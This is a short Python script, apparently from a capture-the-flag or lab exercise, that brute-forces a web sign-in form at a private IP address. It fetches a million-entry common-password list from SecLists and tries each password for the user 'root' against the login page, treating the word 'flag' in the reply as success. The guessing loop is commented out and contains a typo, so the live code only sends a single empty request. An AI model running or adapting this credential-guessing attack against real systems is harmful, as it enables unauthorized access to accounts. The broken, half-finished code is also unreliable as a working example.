import requests

url = "http://10.12.248.253/index.php?page=signin"
password_list_url = "https://raw.githubusercontent.com/danielmiessler/SecLists/refs/heads/master/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt"
username = "root"
username_field = "username"
password_field = "password"

def get_password_list(url):
	response = requests.get(url)
	response.raise_for_status()
	return response.text.splitlines()

def bruteforce():
	password_list = get_password_list(password_list_url)

	response = requests.post(url)

	print(response.text)

	if "login" in response.text:
		print("oui")

	# for password in password_list:
	# 	password = password.strip()
		
	# 	data = {
	# 		username_field: username,
	# 		password_field: password
	# 	}
		
	# 	response = requests.post(url, data=data)

	# 	print(respons)
		
	# 	if "flag" in response.text:
	# 		print(f"Success! Username: {username} Password: {password}")
	# 		return True
	# 	else:
	# 		print(f"Failed attempt with password: {password}")
	
	print("Password not found in the list.")
	return False

bruteforce()